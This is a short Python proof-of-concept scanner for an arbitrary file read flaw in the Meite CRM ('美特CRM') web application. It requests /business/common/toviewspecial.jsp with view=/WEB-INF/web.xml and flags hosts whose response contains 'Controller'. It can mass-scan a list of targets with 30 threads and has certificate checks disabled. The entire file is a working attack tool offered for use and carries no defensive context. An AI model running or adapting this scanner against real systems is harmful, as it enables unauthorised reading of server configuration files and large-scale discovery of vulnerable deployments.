import warnings
import requests
import argparse
from multiprocessing.dummy import Pool
import urllib3
def main():
    urllib3.disable_warnings()
    warnings.filterwarnings("ignore")
    banner='''
         _      _____ _ _____ _____
        / \__/|/  __// Y__ __Y  __/
        | |\/|||  \  | | / \ |  \  
        | |  |||  /_ | | | | |  /_ 
        \_/  \|\____\\_/ \_/ \____\
                           
    '''
    print(banner)
    parser=argparse.ArgumentParser(description="美特CRM 任意文件读取poc")
    parser.add_argument("-u","--url",dest="url",help="example:python -u http://dawdwad")
    parser.add_argument("-f","--file",dest="file",help="example:python -f 123.txt")
    arg=parser.parse_args()
    urls=[]
    if arg.url:
        if "http" not in arg.url:
            url=f"http://{arg.url}"
        else:
            url=arg.url
        check(url)
    elif arg.file:
        with open(arg.file,'r+')as f:
            for i in f:
                domain=i.strip()
                if "http" not in domain:
                    urls.append(f"http://{domain}")
                else:
                    urls.append(domain)
        pool = Pool(30)
        pool.map(check, urls)
def check(domain):
    url=f"{domain}/business/common/toviewspecial.jsp?view=/WEB-INF/web.xml"
    header={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',
        'Content-Type':'text/html;charset=utf-8'
    }
    try:
        r=requests.get(url, header,verify=False,timeout=3)
        r.encoding='utf-8'
        res=r.text
        if 'Controller' in res and r.status_code == 200:
            print(f"[*]存在漏洞:{url}")
        else:
            print("[-]不存在漏洞")
    except Exception as e:
        print("网站出现错误")
if __name__=='__main__':
    main()